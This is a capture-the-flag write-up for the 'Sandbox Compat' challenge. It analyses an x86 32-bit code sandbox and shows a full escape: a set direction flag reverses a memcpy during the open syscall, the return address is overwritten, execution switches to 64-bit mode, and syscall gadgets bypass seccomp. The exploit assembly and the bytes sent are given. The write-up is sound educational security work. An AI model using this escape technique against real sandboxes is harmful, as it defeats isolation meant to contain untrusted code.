# Sandbox Compat (pwn 420p, 5 solved)

> x86 memory segmentation is easy, just put everything untrusted under 4G.

In the task we get [64-bit Linux executable](sandbox) of the server application with its full source code.

The challenge name and description suggest that the application implements a sandbox.
Additional details presented once we connect confirm this:
```
$ nc sandbox-compat.ctfcompetition.com 1337
beef0000-bef00000 rw-p 00000000 00:00 0
dead0000-dead1000 r-xp 00000000 00:00 0
fffff000-100001000 r-xp 00000000 00:00 0
[*] gimme some x86 32-bit code!
```
Sandboxes are applications designed to execute untrusted code in restricted environment.
Solving sandbox challenges typically requires bypassing some of these restrictions.
So let's undestand how this particular sandbox works and what restrictions are implemented.

## Sandbox Details

We start by inspecting `main` function from the provided source code that nicely represents overall structure of the application:
```
int main(void)
{
  ...

  setup_userland();
  setup_kernelland();
  check_proc_maps(1);
  install_seccomp();

  go();

  return 0;
}
```

Now, we can examine each of the steps.

### Userland Setup

The subroutine `setup_userland` starts by configuring the local descriptor table (LDT):
```
  struct user_desc desc;
  ...

  memset(&desc, 0, sizeof(desc));
  desc.entry_number = 1;
  desc.base_addr = 0;
  desc.limit = (1L << 32) - 1;
  desc.seg_32bit = 1;
  desc.contents = 2;                            /* MODIFY_LDT_CONTENTS_CODE */
  desc.read_exec_only = 0;
  desc.limit_in_pages = 1;
  desc.seg_not_present = 0;
  desc.useable = 1;
```
and making it available for the current processes:
```
  if (modify_ldt(1, &desc, sizeof(desc)) != 0)
    err(1, "failed to setup 32-bit segment");
```

The local descriptor table is a data structure used by x86-family to define memory areas available for the program.

When `modify_ldt` is called, the Linux kernel validates the passed structure and creates new descriptor table for our process.
By loading the corresponding segment selector into CS segment register, the processor is be able to execute 32-bit code within our 64-bit process.

The value of segment selector encodes entry_number, which of the tables to use and requested privilege level:
```
struct selector {
    unsinged int  requested_privilege_level:2;  /* 3 is used by used mode in Linux */
    unsinged int  table:1;                      /* 1 for LDT, 0 for GDT */
    unsinged int  entry_number:13;
};
```

Selector values relavant for our application are:
* 0x0F for the registered descriptor (requested_privilege_level=3, table=1, entry_number=1)
* 0x33 for standard descriptor GDT_ENTRY_DEFAULT_USER_CS

By loading these descriptors, the application can switch between 32-bit and 64-bit mode.

A hidden detail in the sandbox source code is implicit initialization of `user_desc.lm` field that actually controls if the code should execute as 64-bit or 32-bit.
Fortunately the field is initialized as zero with `memset`.

Next, the subroutine prepares page with the following trampoline code at the end of 32-bit address space, setting permissions PROT_READ | PROT_EXEC:
```
BITS 32

        ...
        jmp     trampoline
        ...

        ;; trampoline to 64-bit code
        ;; there is a NOP at 0xffffffff, followed by kernel entry
trampoline:
        jmp     dword 0x33:0xffffffff

```

The above code is used to switch to 64-bit code as explainted earlier.

Finally it allocates pages for userland code and stack:
```
  /* setup page for user-supplied code */
  flags = MAP_PRIVATE | MAP_ANONYMOUS | MAP_32BIT | MAP_FIXED;
  p = mmap(USER_CODE, PAGE_SIZE, PROT_READ | PROT_EXEC, flags, -1, 0);
  if (p != USER_CODE)
    err(1, "mmap");

    /* setup rw pages for user stack */
  flags = MAP_PRIVATE | MAP_ANONYMOUS | MAP_32BIT | MAP_FIXED;
  p = mmap(USER_STACK, STACK_SIZE, PROT_READ | PROT_WRITE, flags, -1, 0);
  if (p != USER_STACK)
    err(1, "mmap");
```

### Kernelland Setup

The subroutine `setup_kernelland` allocates single page to store kernelland entry code directly following user-mode trampoline.

It also allocates single page for kernel stack at non-fixed address:
```
  flags = MAP_PRIVATE | MAP_ANONYMOUS;
  stack = mmap(NULL, STACK_SIZE, PROT_READ | PROT_WRITE, flags, -1, 0);
  if (stack == MAP_FAILED)
    err(1, "mmap");
```
In case when the Linux kernel allocates this page in low 4 GBytes, the untrusted sandbox code could potentially access and modify content of 64-bit stack.
However this issue is not explotaible:
* I'm pretty sure that Linux kernel would not allocate such page in low memory at this point of process execution,
* Even if such allocation would happen, the application will detect it later in `check_proc_maps` as will be describe bellow.

The kernel code directly following user-mode trampoline looks like that:
```
        BITS    64

        ...

        mov     rax, fs
        test    rax, rax
        jnz     bad
        mov     rax, gs
        test    rax, rax
        jnz     bad

        ;; save rsp into rbx
        mov     rbx, rsp

        ;; setup stack
        mov     rsp, 0xdeadbeefdeaddead         /* replaced with top of the stack */
        push    rbx

        ;; call kernel function
        mov     rax, 0xdeadbeefdeadc0de         /* replaced with address of `kernel` subroutine */
        call    rax

        ;; restore rsp back to rbx
        pop     rbx
        mov     rsp, rbx

        ;; trampoline to 32-bit code (segment selector 0xf)
        ;; 0xfffffff5: ret gadget
        mov     rcx, 0xffffffff5
        push    rcx
        retf

bad:
        ud2
```

Where called `kernel` subroutine is implemented in C.

A very important observation about the above code is that content of `flags` register is not sanitized on transistion from userland to kernelland.
This will lead to sucessful explitation that I will demonstrate.

The called kernel implements following calls from userland:
* `__NR_read` enforcing all of read buffer within low 4 GBytes
* `__NR_write` enforcing all of write buffer within low 4 GBytes
* `__NR_open` enforcing all of pathname within low 4 GBytes and no `flag` substring in pathname
* `__NR_close`
* `__NR_mprotect` implemented as no-op
* `__NR_exit_group`

### Memory Maps Check

The subroutine `check_proc_maps` parses `/proc/self/maps` to ensure that low 4 GBytes contain only userland stack, userland code and trampoline.
This avoids any potential risks due to address space randomization on application memory and kernelland stack.

### SECCOMP Installation

The subroutine `install_seccomp` configures limit for creation of new processes:
```
  struct rlimit limit;
  if (getrlimit(RLIMIT_NPROC, &limit) != 0)
    err(1, "getrlimit");

  limit.rlim_cur = 0;
  if (setrlimit(RLIMIT_NPROC, &limit) != 0)
    err(1, "setrlimit");
```
That will block creation of new processes by non-root users.

Next, it installs SECCOMP filter:
```
  if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) != 0)
    err(1, "prctl(NO_NEW_PRIVS)");

  if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog) != 0)
    err(1, "prctl(SECCOMP)");
```

To examine actual SECCOMP rules, I simply run the provided binary with [seccomp analysis tool by david942j](https://github.com/david942j/seccomp-tools) as follows:
```
$ seccomp-tools dump ./sandbox
beef0000-bef00000 rw-p 00000000 00:00 0
dead0000-dead1000 r-xp 00000000 00:00 0
fffff000-100001000 r-xp 00000000 00:00 0
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x0000000c  A = instruction_pointer >> 32
 0001: 0x15 0x00 0x01 0x00000000  if (A != 0x0) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0006: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x15 0x00 0x01 0x00000003  if (A != close) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x15 0x00 0x01 0x0000000a  if (A != mprotect) goto 0014
 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0014: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0016
 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0016: 0x06 0x00 0x00 0x00000000  return KILL
```

The important observation here is that `instruction_pointer` reliably prevents any syscalls from code executing in low 4 GBytes.

### Starting User Code

The subroutine `go` reads up to 4 KBytes of input into temporary buffer.

Next it calls `copy_user_code` subrountine and finally transfers control to userland:
```
  asm volatile (
      "movq     %0, %%rax\n"
      "shlq     $32, %%rax\n"
      "movq     %1, %%rbx\n"
      "orq      %%rbx, %%rax\n"
      "push     %%rax\n"
      "retf\n"
      /* never reached */
      "int $3\n"

      :: "i"(0xf), /* ldt code segment selector. index: 1, table: 1, rpl: 3 */
         "i"(USER_CODE)
      : "rax", "rbx"
                );
```

The called `copy_user_code` ensures that userland code cannot contain any of the following bytes:
```
static struct opcode { char *name; char opcode; } opcodes[] = {
  { "iret",          0xcf },
  { "far jmp",       0xea },
  { "far call",      0x9a },
  { "far ret",       0xca },
  { "far ret",       0xcb },
  { "far jmp/call",  0xff },
  { NULL,            0x00 },
};
```
This blocks all well-known instructions to reload CS segment register.

In case CS segment register could be somehow loaded by user code, e.g. due to potential validation bugs, by using less-known or undocumented instructions or via self-modifying code, we could bypass restrictions on `__NR_open` and `__NR_mprotect` that are implemented by kernelmode.
I wasn't able to indentify any method to perform such CS reload.

Next, the subroutine copies validated code to userland code page and sets permissions to ensure that code cannot be modified:
```
  if (mprotect(USER_CODE, PAGE_SIZE, PROT_READ | PROT_EXEC) != 0)
    err(1, "mprotect");
```

## Exploitation

I identified only one issue during code review, where the `flags` register is not sanitized during transistion from userland to kernelland.

The potential exploitation scenario is setting `direction flag` (DF) in order to change semantics of some *string instructions* during kernelland execution.

Searching for `rep` prefix in provided binary gives interesting fragment from `path_ok` subroutine:
```
0000000000001340 <path_ok.part.0>:
    ...
    1376:       f3 48 a5                rep movs QWORD PTR es:[rdi],QWORD PTR ds:[rsi]
```
The above corresponds to `memcpy` instruction during pathname validation code of `__NR_open`:
```
int path_ok(char *pathname, const char *p)
{
  if (!access_ok(p, MAX_PATH))
    return 0;

  memcpy(pathname, p, MAX_PATH);
  pathname[MAX_PATH - 1] = '\x00';

  if (strstr(pathname, "flag") != NULL)
    return 0;

  return 1;
}
```

The passed `pathname` buffer is allocated on `op_open` stack frame.
With `direction flag` set, the `rep movs` code decrements `rdi` and `rsi` registers on each iteration.
After coping the first qword of userland-supplied data into start of `pathname`, it continues to preceding stack addresses.
This vulnerability allows for controlling over 200 bytes (almost MAX_PATH) on stack just before allocated `pathname` buffer.

Running sandbox under debugger with trivial PoC userland code confirm ability to overwrite `op_open` return address.
This can be exploted as follows to execute user-supplied code in 64-bit mode:
```
        entry:
            mov     esp, 0xbef00000
            sub     esp, 0x200
            std
            push    0
            push    0xdead0000 + hijack_64 - entry
            mov     edi, 2                      /* __NR_open */
            lea     esi, [esp + 8]              /* path */
            xor     eax, eax                    /* mov  eax, 0xfffff000 */
            dec     eax
            shl     eax, 12
            push    eax
            ret
        hijack_64:
            /* Any code to execute in 64-bit mode */
```

Once in 64-bit mode, we can bypass SECCOMP `instruction_pointer` rule by executing pre-existing gadgets located above 4 GBytes.
One of the available gadgets is `syscall@plt` from the sandbox binary:
```
0000000000000ce0 <syscall@plt>:
 ce0:   ff 25 9a 22 20 00       jmp    QWORD PTR [rip+0x20229a]        # 202f80 <syscall@GLIBC_2.2.5>
```

Using this gadget we can construct following code to read `flag` file:
```
        hijack_64:
            movabs  rax, 0x10000001e            /* address of kernel subroutine in kernelland entry page */
            mov     rbp, [rax]
            sub     rbp, 0x760                  /* move back to syscall@plt */

            /* open(pathname, O_RDONLY) */
            mov     rdi, __NR_open
            lea     rsi, [rip + pathname]
            mov     rdx, O_RDONLY
            call    syscall_gadget

            /* read(rax, rsp, 0x100) */
            mov     rdi, __NR_read
            mov     rsi, rax
            mov     rdx, rsp
            mov     rcx, 0x100
            call    syscall_gadget

            /* write(1, rsp, rax) */
            mov     rdi, __NR_write
            mov     rsi, 1
            mov     rdx, rsp
            mov     rcx, 0x100
            /* fall-through */
        syscall_gadget:
            push    rbp
            ret

        pathname:
           .asciz  "flag"
```

Running full exploit against CTF server gives the flag:
```
$ ./exploit.py
[+] Opening connection to sandbox-compat.ctfcompetition.com on port 1337: Done
[DEBUG] Received 0x29 bytes:
    'beef0000-bef00000 rw-p 00000000 00:00 0 \n'
[DEBUG] Received 0x73 bytes:
    'dead0000-dead1000 r-xp 00000000 00:00 0 \n'
    'fffff000-100001000 r-xp 00000000 00:00 0 \n'
    '[*] gimme some x86 32-bit code!\n'
...
[DEBUG] Sent 0x24 bytes:
    00000000  bc 00 00 f0  be 81 ec 00  02 00 00 fd  6a 00 68 24  │····│····│····│j·h$│
    00000010  00 ad de bf  02 00 00 00  8d 74 24 08  31 c0 48 c1  │····│····│·t$·│1·H·│
    00000020  e0 0c 50 c3                                         │··P·││
    00000024
[DEBUG] Sent 0x66 bytes:
    00000000  48 b8 1e 00  00 00 01 00  00 00 48 8b  28 48 81 ed  │H···│····│··H·│(H··│
    00000010  60 07 00 00  48 c7 c7 02  00 00 00 48  8d 35 3f 00  │`···│H···│···H│·5?·│
    00000020  00 00 48 c7  c2 00 00 00  00 e8 31 00  00 00 48 c7  │··H·│····│··1·│··H·│
    00000030  c7 00 00 00  00 48 89 c6  48 89 e2 48  c7 c1 00 01  │····│·H··│H··H│····│
    00000040  00 00 e8 18  00 00 00 48  c7 c7 01 00  00 00 48 c7  │····│···H│····│··H·│
    00000050  c6 01 00 00  00 48 89 e2  48 c7 c1 00  01 00 00 55  │····│·H··│H···│···U│
    00000060  c3 66 6c 61  67 00                                  │·fla│g·│
    00000066
[DEBUG] Sent 0x8 bytes:
    'deadbeef'
[DEBUG] Received 0x17 bytes:
    '[*] received 146 bytes\n'
[DEBUG] Received 0x110 bytes:
    00000000  5b 2a 5d 20  6c 65 74 27  73 20 67 6f  2e 2e 2e 0a  │[*] │let'│s go│...·│
    00000010  43 54 46 7b  48 65 6c 6c  30 5f 4e 34  43 6c 5f 49  │CTF{│Hell│0_N4│Cl_I│
    00000020  73 73 75 65  5f 35 31 21  7d 0a 00 00  00 00 00 00  │ssue│_51!│}···│····│
    00000030  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    *
    00000110
[*] flag = "CTF{Hell0_N4Cl_Issue_51!}"
[*] Closed connection to sandbox-compat.ctfcompetition.com port 1337
```

## Conclusion

Overall very interesting challenge demonstrating one of the most obscure features of basic CPU functionality that we almost always take for granted: the `flags` register.
